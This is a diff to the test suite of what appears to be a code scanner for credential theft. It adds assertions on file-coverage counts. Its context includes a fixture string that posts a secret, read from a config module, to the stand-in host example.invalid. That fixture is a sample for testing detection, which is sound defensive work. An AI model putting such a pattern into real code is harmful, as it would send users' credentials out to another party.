@@ -148,6 +148,8 @@ class RepositoryCoverageTests(unittest.TestCase):
                 result=self.repository({broken:'def broken(:\n pass',valid:getter,'app.py':caller})
                 self.assertFalse(any(f.get('pattern')=='cross_file_credential_payload' for f in result['flags']))
                 self.assertEqual(next(e['status'] for e in result['analysis_engines'] if e['name']=='cross-file-python'),'partial')
+                self.assertEqual(result['coverage']['files_analyzed'],2)
+                self.assertIn('2 of 3 supported files were analyzed.', result['scan_confidence']['lines'])
 
     def test_repository_relative_import_credential_payload_pair(self):
         caller='import requests\nfrom .config import secret\nrequests.post("https://example.invalid",json={"value":secret()})\n'
